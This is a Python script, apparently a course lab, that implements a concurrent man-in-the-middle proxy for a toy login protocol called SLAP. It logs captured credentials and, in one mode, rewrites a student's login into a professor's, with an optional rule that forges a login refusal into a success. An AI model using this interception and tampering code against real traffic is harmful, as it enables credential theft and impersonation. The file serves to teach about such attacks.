"""
Proxy Man-in-the-Middle (MITM) concorrente para o protocolo SLAP (Fase 2).

Posiciona-se entre o cliente e o servidor: aceita a conexao do cliente, abre uma
conexao ao servidor real e faz o relay das mensagens nos dois sentidos, podendo
LER e ALTERAR o conteudo em transito. Atende multiplas sessoes simultaneas.

Redirecionamento: o cliente e apontado para o proxy (ex.: 10.10.10.30:7070), que
repassa para o servidor real (10.10.10.10:7070). Cliente e servidor nao mudam.

Uso:
    python proxy_mitm.py [porta_escuta] [host_servidor] [porta_servidor] [--modificar]

    Sem --modificar: relay transparente (apenas LE/registra o trafego).
    Com  --modificar: aplica as regras de adulteracao (REGRAS_C2S / REGRAS_S2C).

Exemplo (na VM-observador):
    python proxy_mitm.py 7070 10.10.10.10 7070 --modificar
"""
import socket
import sys
import threading
from datetime import datetime

# ---------------------------------------------------------------------------
# Regras de adulteracao (so aplicadas com --modificar).
# Trabalham sobre bytes de UMA linha completa (terminada em \r\n).
#
# Demonstracao padrao: TROCA DE IDENTIDADE. O cliente faz login como
# 'aluno'/'senha123', mas o proxy reescreve a credencial para 'professor'/
# 'acesso2026'. O SERVIDOR autentica professor e responde 230; o CLIENTE ve 230
# e acredita estar logado como aluno. Nenhum dos dois detecta a adulteracao ->
# quebra de integridade e de autenticacao.
# ---------------------------------------------------------------------------
REGRAS_C2S = [  # cliente -> servidor
    (b"USER aluno\r\n", b"USER professor\r\n"),
    (b"PASS senha123\r\n", b"PASS acesso2026\r\n"),
]
REGRAS_S2C = [  # servidor -> cliente
    # Alternativa de demo (forjar resultado): descomente para transformar uma
    # recusa de login em sucesso aos olhos do cliente.
    # (b"530 usuario ou senha invalidos\r\n", b"230 login bem-sucedido\r\n"),
]

# ---------------------------------------------------------------------------
# Estado COMPARTILHADO entre threads -> protegido por locks (regioes criticas).
# Ver CONCORRENCIA.md.
# ---------------------------------------------------------------------------
_lock_saida = threading.Lock()      # serializa o print (evita linhas misturadas)
_lock_contador = threading.Lock()   # protege o contador de sessoes
_contador_sessoes = 0


def proximo_id():
    global _contador_sessoes
    with _lock_contador:
        _contador_sessoes += 1
        return _contador_sessoes


def log(sid, rotulo, msg):
    hora = datetime.now().strftime("%H:%M:%S")
    with _lock_saida:
        print(f"[{hora}][sessao {sid:02d}][{rotulo}] {msg}", flush=True)


def ler_linha(sock):
    """Le uma linha terminada em \\r\\n, byte a byte. Robusto a fragmentacao.
    Retorna os bytes da linha, ou None quando a conexao fecha sem dados."""
    dados = bytearray()
    while not dados.endswith(b"\r\n"):
        try:
            pedaco = sock.recv(1)
        except OSError:
            return bytes(dados) if dados else None
        if not pedaco:                       # conexao fechada
            return bytes(dados) if dados else None
        dados += pedaco
    return bytes(dados)


def aplicar_regras(linha, regras):
    for alvo, troca in regras:
        if alvo in linha:
            linha = linha.replace(alvo, troca)
    return linha


def exibir(linha):
    texto = linha.decode("ascii", errors="replace").strip()
    if "USER " in texto.upper() or "PASS " in texto.upper():
        return f"CREDENCIAL LIDA  {texto!r}"
    return repr(texto)


def repassar(origem, destino, rotulo, regras, sid, fechar):
    """Bombeia linhas de 'origem' para 'destino', aplicando as regras.
    Roda em uma thread por sentido. So mexe em sockets desta sessao -> sem
    estado compartilhado com outras sessoes."""
    try:
        while True:
            linha = ler_linha(origem)
            if not linha:
                break
            nova = aplicar_regras(linha, regras)
            if nova != linha:
                log(sid, rotulo, f"*** MODIFICADO *** {linha!r} -> {nova!r}")
            else:
                log(sid, rotulo, exibir(linha))
            destino.sendall(nova)
    except OSError:
        pass
    finally:
        fechar()  # desbloqueia a thread do sentido oposto


def atender_sessao(cliente_sock, endereco, destino_servidor, regras):
    sid = proximo_id()
    log(sid, "+", f"cliente {endereco[0]}:{endereco[1]} conectado; "
                  f"abrindo servidor {destino_servidor[0]}:{destino_servidor[1]}")
    try:
        servidor_sock = socket.create_connection(destino_servidor, timeout=5)
        servidor_sock.settimeout(None)  # volta ao modo bloqueante para o relay
    except OSError as erro:
        log(sid, "!", f"falha ao conectar no servidor real: {erro}")
        cliente_sock.close()
        return

    def fechar():
        for sk in (cliente_sock, servidor_sock):
            try:
                sk.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass

    t_cs = threading.Thread(target=repassar,
                            args=(cliente_sock, servidor_sock, "C->S", regras[0], sid, fechar),
                            daemon=True)
    t_sc = threading.Thread(target=repassar,
                            args=(servidor_sock, cliente_sock, "S->C", regras[1], sid, fechar),
                            daemon=True)
    t_cs.start()
    t_sc.start()
    t_cs.join()
    t_sc.join()
    cliente_sock.close()
    servidor_sock.close()
    log(sid, "-", "sessao encerrada")


def main():
    args = [a for a in sys.argv[1:] if a != "--modificar"]
    modificar = "--modificar" in sys.argv[1:]

    porta_escuta = int(args[0]) if len(args) > 0 else 7070
    host_servidor = args[1] if len(args) > 1 else "10.10.10.10"
    porta_servidor = int(args[2]) if len(args) > 2 else 7070
    destino_servidor = (host_servidor, porta_servidor)

    # Regras por sentido. Em modo observacao, listas vazias = relay transparente.
    regras = (REGRAS_C2S, REGRAS_S2C) if modificar else ([], [])

    escuta = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    escuta.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    escuta.bind(("0.0.0.0", porta_escuta))
    escuta.listen()

    modo = "MODIFICACAO (adultera o trafego)" if modificar else "OBSERVACAO (relay transparente)"
    log(0, "*", f"Proxy MITM escutando em 0.0.0.0:{porta_escuta} -> "
                f"servidor {host_servidor}:{porta_servidor}  |  modo: {modo}")

    try:
        while True:
            cliente_sock, endereco = escuta.accept()
            # Uma thread por conexao: garante concorrencia e isola falhas.
            threading.Thread(target=atender_sessao,
                             args=(cliente_sock, endereco, destino_servidor, regras),
                             daemon=True).start()
    except KeyboardInterrupt:
        log(0, "*", "Encerrando proxy")
    finally:
        escuta.close()


if __name__ == "__main__":
    main()
